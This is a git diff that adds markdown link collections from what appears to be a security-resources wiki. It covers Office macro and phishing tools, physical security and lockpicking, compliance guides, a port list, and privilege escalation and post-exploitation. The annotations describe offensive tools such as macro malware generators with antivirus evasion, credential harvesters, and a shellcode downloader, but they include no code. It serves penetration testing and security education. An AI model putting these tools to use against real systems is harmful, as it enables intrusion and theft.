+### Microsoft Outlook/Exchange Stuff
+
+* [Exchange Versions, Builds & Dates](https://eightwone.com/references/versions-builds-dates/)
+* [Outlook and Exchange for the Bad Guys Nick Landers - Derbycon6](https://www.youtube.com/watch?v=cVhc9VOK5MY)
+* [Microsoft Support and Recovery Assistant for Office 365](https://testconnectivity.microsoft.com/)
+* Bypass
+
+  * [How to bypass Web-Proxy Filtering](https://www.blackhillsinfosec.com/?p=5831)
+
+* Outlook Rules
+
+  * [Malicious Outlook Rules](https://silentbreaksecurity.com/malicious-outlook-rules/)
+  * [EXE-less Malicious Outlook Rules - BHIS](https://www.blackhillsinfosec.com/?p=5544)
+
+* Tools
+
+  * [MailRaider](https://github.com/xorrior/EmailRaider)
+  * [Phishery](https://github.com/ryhanson/phishery)
+    * An SSL Enabled Basic Auth Credential Harvester with a Word Document
+      Template URL Injector \* MailRaider is a tool that can be used to
+      browse/search a user's Outlook folders as well as send phishing emails
+      internally using their Outlook client.
+
+### MS Office
+
+* [Next Gen Office Malware v2.0 - Greg Linares Dagmar Knechtel - Hushcon17](https://prezi.com/view/eZ3CSNMxPMOfIWEHwTje/)
+* DDE 
+  * [Exploiting Office native functionality: Word DDE edition](https://www.securityforrealpeople.com/2017/10/exploiting-office-native-functionality.html)
+
+* Macros
+
+  * [Malicious Macro Generator](https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator)
+    * Simple utility design to generate obfuscated macro that also include a AV
+      / Sandboxes escape mechanism.
+  * [macphish](https://github.com/cldrn/macphish)
+    * Office for Mac Macro Payload Generator
+  * [SimplyTemplate](https://github.com/killswitch-GUI/SimplyTemplate)
+    * Phishing Template Generation Made Easy. The goal of this project was to
+      hopefully speed up Phishing Template Gen as well as an easy way to ensure
+      accuracy of your templates. Currently my standard Method of delivering
+      emails is the Spear Phish in Cobalt strike so you will see proper settings
+      for that by default.
+  * [RobustPentestMacro](https://github.com/mgeeky/RobustPentestMacro)
+    * This is a rich-featured Visual Basic macro code for use during Penetration
+      Testing assignments, implementing various advanced post-exploitation
+      techniques.
+  * [Generate MS Office Macro Malware Script](https://github.com/enigma0x3/Generate-Macro/blob/master/Generate-Macro.ps1)
+    * Standalone Powershell script that will generate a malicious Microsoft
+      Office document with a specified payload and persistence method
+
+* [InfoPhish](https://github.com/InfoPhish/InfoPhish)
+* [luckystrike](https://github.com/Shellntel/luckystrike)
+
+  * A PowerShell based utility for the creation of malicious Office macro
+    documents.
+
+* [VBad](https://github.com/Pepitoh/VBad)
+
+  * VBad is fully customizable VBA Obfuscation Tool combined with an MS Office
+    document generator. It aims to help Red & Blue team for attack or defense.
+
+### Talks/Presentations
+
+* [Three Years of Phishing - What We've Learned - Mike Morabito](http://www.irongeek.com/i.php?page=videos/centralohioinfosec2015/tech105-three-years-of-phishing-what-weve-learned-mike-morabito)
+
+  * Cardinal Health has been aggressively testing and training users to
+    recognize and avoid phishing emails. This presentation covers 3 years of
+    lessons learned from over 18,000 employees tested, 150,000 individual
+    phishes sent, 5 complaints, thousands of positive comments, and a dozen
+    happy executives. Learn from actual phishing templates what works well,
+    doesn,t work at all, and why? See efficient templates for education and
+    reporting results.
+
+* [Ichthyology: Phishing as a Science - BH USA 2017](https://www.youtube.com/watch?v=Z20XNp-luNA&app=desktop)
+* [Modern Evasion Techniques Jason Lang - Derbycon7](https://www.irongeek.com/i.php?page=videos/derbycon7/t110-modern-evasion-techniques-jason-lang)
+
+  * As pentesters, we are often in need of working around security controls. In
+    this talk, we will reveal ways that we bypass in-line network defenses, spam
+    filters (in line and cloud based), as well as current endpoint solutions.
+    Some techniques are old, some are new, but all work in helping to get a
+    foothold established. Defenders: might want to come to this one.
+
+* [Phishing Like The Pros - Luis Connection Santana - Derbycon 2013](https://www.irongeek.com/i.php?page=videos/derbycon3/1305-phishing-like-the-pros-luis-connection-santana)
+
+  * This talk will discuss phishing techniques used by professionals during
+    phishing campaigns and introduce PhishPoll, a PHP-based phishing framework
+    for creating, managing, and tracking phishing campaigns.
+
+* [MetaPhish - Valsmith, Colin Ames, and David Kerb - DEF CON 17](https://www.youtube.com/watch?v=3DYOMkkTK4A)
diff --git a/source/Physical-Security.md b/source/Physical-Security.md
new file mode 100644
index 0000000..db363d3
--- /dev/null
+++ b/source/Physical-Security.md
@@ -0,0 +1,237 @@
+# Physical Security
+
+### ToC
+
+* [General](#general)
+  * [Articles/Blogposts](#articles)
+  * [Videos/Talks](#videos)
+  * [Tools](#tools)
+  * [Papers](#papers)
+* [Tamper Evident Related](#tamper)
+* [Lockpicking](#lockpicking)
+  * [Guides/Techniques](#guides)
+  * [Videos/Talks](#talks)
+  * [Books](#books)
+  * [Sites/Organizations](#sites)
+* [Alarm Systems](#alarm)
+* [Doors](#doors)
+
+#### Sort
+
+* [Home Alone with localhost - Automating Home Defense - Chris Littlebury Defcon22](https://www.youtube.com/watch?v=9Tbft190x3Q)
+* [Door Control Systems: An Examination of Lines of Attack](https://www.nccgroup.com/en/blog/2013/09/door-control-systems-an-examination-of-lines-of-attack/)
+* [Physical Home Security Options - DiabloHorn](https://diablohorn.wordpress.com/2014/07/13/physical-home-security-options/#more-984)
+* [Hacking things by touching them - armadillo](https://www.armadillophone.com/blog/2017/08/27/hacking-things-by-touching-them)
+* [zoneminder](https://www.zoneminder.com/)
+
+  * A full-featured, open source, state-of-the-art video surveillance software
+    system.
+
+### Articles/Blogposts
+
+* [Physical Security - Centre for the Protection of National Infrastructure - UK](https://www.cpni.gov.uk/physical-security)
+
+### Videos/Talks
+
+* [Physical Penetration Testing You Keep a Knockin But You Cant Come In Phil Grime](https://www.youtube.com/watch?v=_0gz_iWoMT0)
+
+* [Home Insecurity: No Alarms, False Alarms, and SIGINT](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20presentations/Logan%20Lamb/DEFCON-22-Logan-Lamb-HOME-INSECURITY-NO-ALARMS-FALSE-ALARMS-AND-SIGINT-WP.pdf)
+
+  * The market share of home security systems has substantially increased as
+    vendors incorporate more desirable features: intrusion detection,
+    automation, wireless, and LCD touch panel controls. Wireless connectivity
+    allows vendors to manufacture cheaper, more featureful products that require
+    little to no home modification to install. Consumer win, since adding
+    devices is easier. The result: an ostensibly more secure, convenient, and
+    connected home for a larger number of citizens. Sadly, this hypothesis is
+    flawed; the idea of covering a home with more security sensors does not
+    translate into a more secure home. Additionally, the number of homes using
+    these vulnerable systems is large, and the growth rate is increasing
+    producing a even larger problem. In this paper, we will demonstrate a
+    generalized approach for compromising three systems: ADT, the largest home
+    security dealer in North America; Honeywell, one of the largest
+    manufacturers of security devices; and Vivint, a top 5 security dealer. We
+    will suppress alarms, create false alarms, and collect artifacts that
+    facilitate tracking the movements of individuals in their homes
+
+* [Physical Security: From Locks to Dox - Jess Hires](http://www.irongeek.com/i.php?page=videos/derbycon4/t540-physical-security-from-locks-to-dox-jess-hires)
+
+  * This talk is an introduction to Physical Penetration Testing. I briefly
+    cover the Penetration Testing Methodology from a Physical Security
+    perspective, but the talk is mostly oriented around the analysis and
+    exploitation phases. Various attacks will be covered, from lock picking and
+    bypass to safe cracking. No prior experience with lock picking or physical
+    security is required, I will start with the basics and work up to advanced
+    topics.
+
+* [Defcon 19: DIY Non-Destructive-Entry](https://www.youtube.com/watch?v=ChbyaXBKNY8)
+
+### Tools
+
+### Papers
+
+### Tamper Evident Related
+
+* [What does tamper-evident mean?](https://www.healthcarepackaging.com/article/package-design/structural/what-does-tamper-evident-mean)
+* [Introduction to Tamper Evident Devices - DEFCON 19](https://www.youtube.com/watch?v=SIQml3MBJoE&spfreload=10)
+* [Tamper-evident technology - Wikipedia](https://en.wikipedia.org/wiki/Tamper-evident_technology)
+* [Tamper resistance and hardware security](https://www.cl.cam.ac.uk/~sps32/PartII_030214.pdf)
+* [How to Steal a Nuclear Warhead Without Voiding Your XBox Warranty (paper)](https://www.scribd.com/document/47334072/How-to-Steal-a-Nuclear-Warhead-Without-Voiding-Your-XBox-Warranty-paper)
+
+## Lock Picking
+
+### General Information
+
+* [Various types of locks](https://securitysnobs.com/Types-Of-Locks.html)
+* [Wikipedia on Lockpicking](https://en.wikipedia.org/wiki/Lock_picking)
+
+### Guides/Techniques
+
+* [Newbies guide to picking safes](http://cybergibbons.com/lockpicking-2/a-newbies-guide-to-safes/)
+* [Attack the Key, Own the Lock - Defcon18](https://www.youtube.com/watch?v=_-PqzkoQQ7s)
+* [Key Impressioning by Jos Weyers - Defcon 19](https://www.youtube.com/watch?v=s8aQSxXoLFk)
+* [Safecracking for the computer scientist](http://www.crypto.com/papers/safelocks.pdf)
+* [Jos Weyers – Lock Impressioning](https://www.youtube.com/watch?v=JcNc1BVaCE0)
+* [CIA Lock Picking [Field Operative Training Manual]](https://archive.org/details/pdfy-eGBVTYko5TUI5P_B)
+* [Lock Picking Course - LockLab](https://lock-lab.com/locklab-university/lock-picking-course-2/)
+* [A newbies guide to safes, both opening and using](https://www.reddit.com/r/WhatsInThisThing/comments/1gm6uk/a_newbies_guide_to_safes_both_opening_and_using/)
+
+### Videos/Talks
+
+* [Safe to Armed in Seconds - Deviant Ollam - DEF CON 19](https://www.youtube.com/watch?v=3SVMT_zNlgA)
+
+* [This Key is Your Key, This Key is My Key - Howard Payne & Deviant Ollam](https://www.youtube.com/watch?v=a9b9IYqsb_U)
+
+* [I'll Let Myself In Tactics of Physical Pentesters - Deviant Ollam -B-sides Orlando 2017](https://www.youtube.com/watch?v=Rctzi66kCX4)
+
+* [Introduction to Lockpicking and Physical Security - DEFCON 13](https://www.youtube.com/watch?v=JupQ3BpKGYg)
+
+* [Lockpicking by Deviant Ollam](http://deviating.net/lockpicking/videos.html)
+
+  * Glorious set of videos and instructional information. Must watch.
+
+* [Electronic Locks - are really secure?!](https://www.youtube.com/watch?v=ZK0MfE7o4HU)
+
+  * Many people are familiar with the ways in which mechanical locks can be
+    attacked, compromised, and bypassed. Indeed, the hands-on workshops and the
+    availability of pick tools at the Lockpick Village is an enduring part of
+    the fun at DeepSec and other popular security conferences around the world.
+    Often, attendees will ask questions like, "So, this is really great... but
+    what if someone is using an electronic lock? How hard is it to open the
+    door, then?" Unfortunately, due to time and space constraints, our answer is
+    typically, "Well... that's a very complicated question. Sometimes they're
+    good, and sometimes they're weak." We often promise greater detail another
+    day, another time... but until now that time has not come. Finally now,
+    however, TOOOL will describe some of the most popular electronic locks and
+    show examples of how they can sometimes be attacked.
+
+* [Distinguishing Lockpicks: Raking vs Lifting vs Jiggling and More - Deviant Ollam](https://www.youtube.com/watch?v=e07VRxJ01Fs)
+
+* [Mastering Master Keys - Deviant Ollam - HOPE Number 9](https://www.youtube.com/watch?v=aVPSaKLKHd4)
+
+* [!$@$Lockpicking & Physical security - Deviant Ollam - Best lockpicking course abc tutorial diy](https://www.youtube.com/watch?v=j6WCe-4XQ3Q)
+
+* [Lockpicking, Safecracking, & More by Deviant Ollam & renderman at ShmooCon 3](https://www.youtube.com/watch?v=WTgUVhjts2U)
+
+  * For the first time on the same stage together at ShmooCon, renderman and i
+    give a funny and informative presentation about lockpicking using much of my
+    traditional material as well as a whole load of new content that my favorite
+    Canadian demonstrates. In addition to his all-around general badassery,
+    renderman even opened up a locked safe on stage... one that he had never
+    seen before and was simply given by an audience member. That took fucking
+    balls.
+
+* ["Lockpicking in Real Life versus on the Screen" - The Eleventh HOPE (2016)](https://www.youtube.com/watch?v=mjBSocgMCPU)
+
+  * We all know that Hollywood has a difficult time portraying hackers
+    accurately. This quirk often extends to the realm of showing lockpicking in
+    movies and on TV. But sometimes, a film gets it really right! This talk is
+    both an introduction to lockpicking (in case you still need to learn) as
+    well as a walk through some of the best - and some of the worst - scenes of
+    lockpicking that have ever been seen by movie and TV audiences. Learn about
+    how to be a better lockpicker and a better filmmaker... all at the same
+    time!
+
+* [Electronic Safe Fail](http://www.irongeek.com/i.php?page=videos/centralohioinfosec2015/tech204-electronic-safe-fail-jeff-popio)
+
+  * Commonly safes are used in IT to secure backup tapes, certificate roots, and
+    other sensitive material. This talk will demonstrate that many of the safes
+    used to secure these sensitive materials are ineffective. Today there are
+    many varieties of electronic safes that utilize a VERY weak mechanism to
+    physically lock the safe. In many cases there are ways to open the safe in
+    less than a minute that leaves no evidence behind. (Sometimes only a few
+    seconds) This talk will cover my experience discovering the flaw and dealing
+    with a safe vendor to issue a fix, then discovering the inadequacies of the
+    fix itself and vendor's continuing ignorance of the problem with most
+    electronic locks. Fixing these problems can be relatively easy. There will
+    be general instruction on how to fix the problems and what needs to be done
+    by the vendors to make safes well... safer."
+
+* [Lockpicking how to video using a cut-away lock](http://www.youtube.com/watch?v=LSt0RxkA_f8)
+
+* [Distinguishing Lockpicks: Raking vs Lifting vs Jiggling and More - Deviant Ollam](https://www.youtube.com/watch?v=e07VRxJ01Fs)
+
+#### Alarm Systems
+
+* [Ways your alarm system can fail - abak Javadi Keith Howell](https://www.youtube.com/watch?v=g4-B7d3ZQUA)
+
+* [Alarmed About Your Alarm System Yet - Keith Howell, Babak Javadi](https://www.youtube.com/watch?v=5rnkhqEj_Po)
+
+* [Hacking Wireless Home Security Systems by Eric Escobar - BSides Manchester2017](https://www.youtube.com/watch?v=kERUpg5YMis&index=12&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+
+* [Home Insecurity: No Alarms, False Alarms, and SIGINT](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20presentations/Logan%20Lamb/DEFCON-22-Logan-Lamb-HOME-INSECURITY-NO-ALARMS-FALSE-ALARMS-AND-SIGINT-WP.pdf)
+
+* [Let's get physical: Breaking home security systems & bypassing controls - Black Hat USA 2013](https://www.youtube.com/watch?v=O4ya3z-PCQs)
+
+#### Doors
+
+* [What Does The Perfect Door Or Padlock Look Like? - Deviant Ollam - BruCON 0x08](https://www.youtube.com/watch?v=4skSBwBBI-s)
+
+* [The Search for the Perfect Door - Deviant Ollam - Shakacon](https://www.youtube.com/watch?v=4YYvBLAF4T8)
+
+  * You have spent lots of money on a high-grade, pick-resistant, ANSI-rated
+    lock for your door. Your vendor has assured you how it will resist attack
+    and how difficult it would be for someone to copy your key. Maybe they’re
+    right. But… the bulk of attacks that both penetration testers and also
+    criminals attempt against doors have little or nothing to do with the lock
+    itself! This talk will be a hard-hitting exploration (full of photo and
+    video examples) of the ways in which your door — the most fundamental part
+    of your physical security — can possibly be thwarted by someone attempting
+    illicit entry. The scary problems will be immediately followed by simple
+    solutions that are instantly implementable and usually very within-budget.
+    You, too, can have a near-perfect door… if you’re willing to learn and
+    understand the problems that all doors tend to have.
+
+* [Physical Security - Everything That's Wrong With Your Typical Door - Deviant Ollam - SANS Webcast](https://www.youtube.com/watch?v=raBMFqZRB0s&t=&feature=youtu.be&app=desktop)
+
+* [Door Control Systems: An Examination of Lines of Attack](https://www.nccgroup.com/en/blog/2013/09/door-control-systems-an-examination-of-lines-of-attack/)
+
+### Books
+
+* [Locksport Primer](http://pdf.textfiles.com/security/lsiguide.pdf)
+
+* [Academic book on Locks](https://www.goodreads.com/book/show/525753.Locks_Safes_and_Security)
+
+* [MIT Guide to Lockpicking](http://www.capricorn.org/~akira/home/lockpick/)
+
+### Sites/Organizations
+
+* [The Open Organization of Lockpickers](http://toool.us/)
+
+  * The mission of the Open Organisation Of Lockpickers is to advance the
+    general public knowledge about locks and lockpicking. By examining locks,
+    safes, and other such hardware and by publicly discussing our findings we
+    hope to strip away the mystery with which so many of these products are
+    imbued. The more that people know about lock technology, the better they are
+    capable of understanding how and where certain weaknesses are present. This
+    makes them well-equipped to participate in sportpicking endeavors and also
+    helps them simply be better consumers in the marketplace, making decisions
+    based on sound fact and research.
+
+* [lockpicking101](http://www.lockpicking101.com/)
+
+  * A community dedicated to the fun and ethical hobby of lock picking.
+
+* [/r/lockpicking - Reddit Lockpicking Community](https://www.reddit.com/r/lockpicking)
+
+* [keypicking.com](http://www.keypicking.com/)
diff --git a/source/Policy-Compliance.md b/source/Policy-Compliance.md
new file mode 100644
index 0000000..3a6442b
--- /dev/null
+++ b/source/Policy-Compliance.md
@@ -0,0 +1,54 @@
+# Policy & Compliance
+
+### Table of Contents
+
+* [General](#general)
+* [Talks & Presentations](#talks)
+* [Miscellaneous](#misc)
+* [Papers](#papers)
+
+#### General
+
+* [The Red Book: A Roadmap for Systems Security Research](http://www.red-book.eu/m/documents/syssec_red_book.pdf)
+* [IT Law Wiki](http://itlaw.wikia.com/wiki/The_IT_Law_Wiki))
+
+#### Guides
+
+* [Technical Guide to Information Security Testing and Assessment - NIST-800-115](http://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
+* [Security and Privacy Controls forFederal Information Systemsand Organizations - NIST-800-53](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf)
+* [NIST Cybersecurity Practice Guide, Securing Wireless Infusion Pumps in Healthcare Delivery Organizations](https://nccoe.nist.gov/projects/use-cases/medical-devices)
+
+  * [SP 1800-8a: Executive Summary](https://nccoe.nist.gov/publication/draft/1800-8/VolA/)
+  * [SP 1800-8b: Approach, Architecture, and Security Characteristics ](https://nccoe.nist.gov/publication/draft/1800-8/VolB/)
+  * [SP 1800-8c: How-To Guides](https://nccoe.nist.gov/publication/draft/1800-8/VolC/)
+
+* [SP 800-115: Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/publications/detail/sp/800-115/final)
+
+  * The purpose of this document is to assist organizations in planning and
+    conducting technical information security tests and examinations, analyzing
+    findings, and developing mitigation strategies. The guide provides practical
+    recommendations for designing, implementing, and maintaining technical
+    information security test and examination processes and procedures. These
+    can be used for several purposes, such as finding vulnerabilities in a
+    system or network and verifying compliance with a policy or other
+    requirements. The guide is not intended to present a comprehensive
+    information security testing and examination program but rather an overview
+    of key elements of technical security testing and examination, with an
+    emphasis on specific technical techniques, the benefits and limitations of
+    each, and recommendations for their use.
+
+* [Security Assessment Guidelines for Financial Institutions](https://www.sans.org/reading-room/whitepapers/auditing/security-assessment-guidelines-financial-institutions-993)
+
+* [Information Security Risk Assessment Guidelines - mass.gov](http://www.mass.gov/anf/research-and-tech/cyber-security/security-for-state-employees/risk-assessment/risk-assessment-guideline.html)
+
+#### Talks & Presentations
+
+* [The foundation is rotting and the basement is flooding: A deeper look at the implicit trust relationships in your organization](https://www.youtube.com/watch?v=nL64uj9Xm24)
+
+#### Papers
+
+* [A Survey of Insider Attack Detection Research - 2008](http://web.stanford.edu/class/cs259d/readings/Insider_survey.pdf)
+
+* [The “Big Picture” of Insider IT Sabotage Across U.S. Critical Infrastructures](http://web.stanford.edu/class/cs259d/readings/Infrastructure.pdf)
+
+* [An Overview of Threat and Risk Assessment](https://www.sans.org/reading-room/whitepapers/auditing/overview-threat-risk-assessment-76)
diff --git a/Draft/Port_List.md b/source/Port-List.md
similarity index 98%
rename from Draft/Port_List.md
rename to source/Port-List.md
index 300d67b..9e22b9c 100644
--- a/Draft/Port_List.md
+++ b/source/Port-List.md
@@ -207,15 +207,15 @@
 |62078||Apple iDevice||
 |64738||Mumble||
 
-# Links
+### Links
 
 1. http://www.rfc-editor.org/search/rfc_search.php
 2. http://packetlife.net/
 3. https://www.leanpub.com/shodan
 
+* Originally taken from: https://github.com/nixawk/pentest-wiki/blob/master/3.Exploitation-Tools/Network-Exploitation/ports_number.md
 
-
-Originally taken from: https://github.com/nixawk/pentest-wiki/blob/master/3.Exploitation-Tools/Network-Exploitation/ports_number.md
+````
 The MIT License (MIT)
 
 Copyright (c) 2016 Vex Woo
@@ -236,4 +236,5 @@ FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
\ No newline at end of file
+SOFTWARE.
+````
\ No newline at end of file
diff --git a/source/Privilege-Escalation-Post-Exploitation.md b/source/Privilege-Escalation-Post-Exploitation.md
new file mode 100644
index 0000000..51461b4
--- /dev/null
+++ b/source/Privilege-Escalation-Post-Exploitation.md
@@ -0,0 +1,1703 @@
+# Privilege Escalation & Post-Exploitation
+
+### Table of Contents
+
+* [General](#general)
+* [Linux Privilege Escalation](#linpriv)
+* [Windows Privilege Escalation](#winpriv)
+* [OS X lege Escalation](#osxpriv)
+* [Miscellaneous Privilege Escalation](#miscpriv)
+* [Powershell Stuff](#powershell-stuff)
+* [DLL Stuff](#dll)
+* [General Post Exploitation](#generalpost)
+* [Linux Post Exploitation](#linpost)
+* [OS X Post Exploitation](#osxpost)
+* [Windows Post Exploitation](#winpost)
+* [ActiveDirectory](#ad)
+* [Kerberos](#kerberos)
+* [Office Macros](#officemacro)
+* [Email/Exchange](#email)
+* [Grabbing Goodies](#grabbing)
+* [Gaining Awareness](#awareness)
+* [Persistence Techniques](#persistence)
+* [OS X Persistence](#osxpersist)
+* [Pivoting & Lateral movement](#pivot)
+* [Avoiding/Bypassing Anti-Virus/Whitelisting/Sandboxes/etc](#av)
+* [Containers & Docker](#docker)
+* [Payloads](#payloads)
+* [Code Injection](#inject)
+* [Papers](#papers)
+
+### To do:
+
+* Update ToC so it's accurate
+* sort things into kerberos section
+
+### CULL
+
+* https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#escalating
+* [Less is More, Exploring Code/Process-less Techniques and Other Weird Machine Methods to Hide Code (and How to Detect Them)](https://cansecwest.com/slides/2014/less%20is%20more3.pptx)
+* [Shellpaste](https://github.com/andrew-morris/shellpaste)
+
+  * Tiny snippet of code that pulls ASCII shellcode from pastebin and executes
+    it. The purpose of this is to have a minimal amount of benign code so AV
+    doesn't freak out, then it pulls down the evil stuff. People have been doing
+    this kind of stuff for years so I take no credit for the concept. That being
+    said, this code (or similar code) works surprisingly often during pentests
+    when conventional malware fails.
+
+* [File Server Triage on Red Team Engagements](http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/)
+* [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
+
+  * Move to mobile
+
+* [Untethered initroot (USENIX WOOT '17)](https://alephsecurity.com/2017/08/30/untethered-initroot/)
+
+### General
+
+* [Stegano](https://github.com/cedricbonhomme/Stegano)
+
+  * Steganography is the art and science of writing hidden messages in such a
+    way that no one, apart from the sender and intended recipient, suspects the
+    existence of the message, a form of security through obscurity.
+    Consequently, functions provided by Stéganô only hide messages, without
+    encryption. Steganography is often used with cryptography.
+
+* [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
+
+  * A tool to create a JScript file which loads a .NET v2 assembly from memory.
+
+* [Evading Autoruns Kyle Hanslovan Chris Bisnett - DerbyCon 7](https://www.youtube.com/watch?v=AEmuhCwFL5I&app=desktop)
+
+### Linux Privilege Escalation
+
+#### Blogposts/Writeups
+
+* [Dangerous Sudoers Entries – Series, 5 parts](https://blog.compass-security.com/2012/10/dangerous-sudoer-entries-part-1-command-execution/)
+* [No one expect command execution!](http://0x90909090.blogspot.fr/2015/07/no-one-expect-command-execution.html)
+* [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
+* [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+* [Using the docker command to root the host (totally not a security issue)](http://reventlov.com/advisories/using-the-docker-command-to-root-the-host)
+
+  * It is possible to do a few more things more with docker besides working with
+    containers, such as creating a root shell on the host, overwriting system
+    configuration files, reading restricted stuff, etc.
+
+* [#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine](https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/)
+
+#### Talks/Videos
+
+* [Chw00t: Breaking Unixes’ Chroot Solutions](https://www.youtube.com/watch?v=1A7yJxh-fyc)
+
+#### Tools
+
+* [Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
+
+  * Linux Exploit Suggester; based on operating system release number. This
+    program run without arguments will perform a 'uname -r' to grab the Linux
+    Operating Systems release version, and return a suggestive list of possible
+    exploits. Nothing fancy, so a patched/back-ported patch may fool this
+    script. Additionally possible to provide '-k' flag to manually enter the
+    Kernel Version/Operating System Release Version.
+
+* [Basic Linux Privilege Escalation - g0tmi1k](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+  * Not so much a script as a resource, g0tmi1k’s blog post here has led to so
+    many privilege escalations on Linux system’s it’s not funny. Would
+    definitely recommend trying out everything on this post for enumerating
+    systems.
+
+* [LinEnum](http://www.rebootuser.com/?p=1758)
+
+  * This tool is great at running through a heap of things you should check on a
+    Linux system in the post exploit process. This include file permissions,
+    cron jobs if visible, weak credentials etc. The first thing I run on a newly
+    compromised system.
+
+* [LinuxPrivChecker](http://www.securitysift.com/download/linuxprivchecker.py)
+
+  * This is a great tool for once again checking a lot of standard things like
+    file permissions etc. The real gem of this script is the recommended
+    privilege escalation exploits given at the conclusion of the script. This is
+    a great starting point for escalation.
+
+* [Unix Privilege Escalation Checker](https://code.google.com/p/unix-privesc-check/)
+
+  * Unix-privesc-checker is a script that runs on Unix systems (tested on
+    Solaris 9, HPUX 11, Various Linuxes, FreeBSD 6.2). It tries to find
+    misconfigurations that could allow local unprivileged users to escalate
+    privileges to other users or to access local apps (e.g. databases). It is
+    written as a single shell script so it can be easily uploaded and run (as
+    opposed to un-tarred, compiled and installed). It can run either as a normal
+    user or as root (obviously it does a better job when running as root because
+    it can read more files).
+
+* [EvilAbigail](https://github.com/GDSSecurity/EvilAbigail/blob/master/README.md)
+
+  * Initrd encrypted root fs attack
+
+* [Triple-Fetch-Kernel-Creds](https://github.com/coffeebreakerz/Tripple-Fetch-Kernel-Creds)
+
+  * Attempt to steal kernelcredentials from launchd + task_t pointer (Based on:
+    CVE-2017-7047)
+
+### Windows Privilege Escalation
+
+* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
+* [Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
+* [Common Windows Privilege Escalation Vectors](https://toshellandback.com/2015/11/24/ms-priv-esc/)
+* [Abusing Token Privileges For LPE - drone/breenmachine](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
+* [Analyzing local privilege escalations in win32k](http://uninformed.org/?v=all&a=45&t=sumry)
+
+  * This paper analyzes three vulnerabilities that were found in win32k.sys that
+    allow kernel-mode code execution. The win32k.sys driver is a major component
+    of the GUI subsystem in the Windows operating system. These vulnerabilities
+    have been reported by the author and patched in MS08-025. The first
+    vulnerability is a kernel pool overflow with an old communication mechanism
+    called the Dynamic Data Exchange (DDE) protocol. The second vulnerability
+    involves improper use of the ProbeForWrite function within string management
+    functions. The third vulnerability concerns how win32k handles system menu
+    functions. Their discovery and exploitation are covered.
+
+* [Some forum posts on Win Priv Esc](https://forums.hak5.org/index.php?/topic/26709-windows-7-now-secure/)
+* [The “SYSTEM” challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
+
+  * Writeup of achieving system from limited user privs.
+
+* [Windows Privilege Escalation Cheat Sheet/Tricks](http://it-ovid.blogspot.fr/2012/02/windows-privilege-escalation.html)
+* [Introduction to Logical Privilege Escalation on Windows - James Forshaw](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf)
+* [Windows Logical EoP Workbook](https://docs.google.com/document/d/1qujIzDmFrcFCBeIgMjWDZTLNMCAHChAnKDkHdWYEomM/edit)
+* [Exploiting Windows 2008 Group Policy Preferences](http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html)
+* [Post Exploitation Using netNTLM Downgrade attacks - Fishnet/Archive.org](https://web.archive.org/web/20131023064257/http://www.fishnetsecurity.com/6labs/blog/post-exploitation-using-netntlm-downgrade-attacks)
+* [All roads lead to SYSTEM](https://labs.mwrinfosecurity.com/system/assets/760/original/Windows_Services_-_All_roads_lead_to_SYSTEM.pdf)
+* [Old Privilege Escalation Techniques](http://obscuresecurity.blogspot.com/2011/11/old-privilege-escalation-techniques.html)
+* [Windows: DCOM DCE/RPC Local NTLM Reflection Elevation of Privilege](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1)
+* [How to own any windows network with group policy hijacking attacks](https://labs.mwrinfosecurity.com/blog/2015/04/02/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/)
+* [The Art of Becoming TrustedInstaller](https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html)
+
+  * There's many ways of getting the TI token other than these 3 techniques. For
+    example as Vincent Yiu pointed out on Twitter if you've got easy access to a
+    system token, say using Metasploit's getsystem command you can impersonate
+    system and then open the TI token, it's just IMO less easy :-). If you get a
+    system token with SeTcbPrivilege you can also call LogonUserExExW or
+    LsaLogonUser where you can specify an set of additional groups to apply to a
+    service token. Finally if you get a system token with SeCreateTokenPrivilege
+    (say from LSASS.exe if it's not running PPL) you can craft an arbitrary
+    token using the NtCreateToken system call.
+
+#### Talks and Videos
+
+* [Hacking windows through the Windows API; delves into windows api, how it can break itself](http://www.irongeek.com/i.php?page=videos/derbycon4/t122-getting-windows-to-play-with-itself-a-pen-testers-guide-to-windows-api-abuse-brady-bloxham)
